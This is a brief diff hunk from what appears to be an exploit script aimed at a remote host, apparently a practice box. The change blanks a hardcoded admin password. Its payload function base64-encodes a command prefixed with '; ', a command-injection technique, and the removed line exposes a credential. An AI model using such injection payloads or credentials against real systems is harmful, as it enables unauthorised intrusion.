@@ -5,7 +5,7 @@ parser.add_argument('rhost', help='Remote host IP')
 args = parser.parse_args()
 
 USERNAME='admin'
-PASSWORD='NET_45JDX23'
+PASSWORD=''	# Removed because box is still active
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
